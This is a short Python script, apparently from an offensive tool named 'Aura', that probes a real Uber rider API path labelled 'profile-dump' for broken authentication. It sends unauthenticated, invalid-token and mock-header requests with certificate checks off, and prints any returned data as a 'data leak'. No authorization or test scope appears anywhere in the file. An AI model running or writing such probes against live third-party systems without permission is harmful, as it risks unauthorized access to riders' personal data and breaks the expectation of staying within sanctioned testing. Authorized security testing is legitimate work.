import asyncio
import httpx
from aura.ui.formatter import console

async def main():
    target = "https://riders.uber.com/api/riders/v1/profile-dump"
    # Testing for IDOR / Broken Authentication
    
    console.print(f"[bold red]🎯 TARGETING SENSITIVE ENDPOINT: {target}[/bold red]")
    
    headers_sets = [
        {"User-Agent": "Aura/Offensive"}, # No auth at all
        {"Authorization": "Bearer invalid_token"}, # Invalid token
        {"X-Uber-Token": "test"} # Mocking Uber specific headers
    ]
    
    async with httpx.AsyncClient(verify=False) as client:
        for headers in headers_sets:
            try:
                console.print(f"[*] Testing with headers: {headers}")
                resp = await client.get(target, headers=headers, timeout=15)
                
                status = resp.status_code
                if status == 200:
                    console.print(f"[bold reverse red]🔥🔥 CRITICAL: DATA LEAK DETECTED! 🔥🔥[/bold reverse red]")
                    console.print(f"Response: {resp.text[:500]}")
                elif status == 401 or status == 403:
                    console.print(f"[green][✓] Access Denied (Correct Behavior: {status})[/green]")
                else:
                    console.print(f"[yellow][!] Unusual Status: {status}[/yellow]")
            except Exception as e:
                console.print(f"[red]Error: {e}[/red]")

if __name__ == "__main__":
    asyncio.run(main())
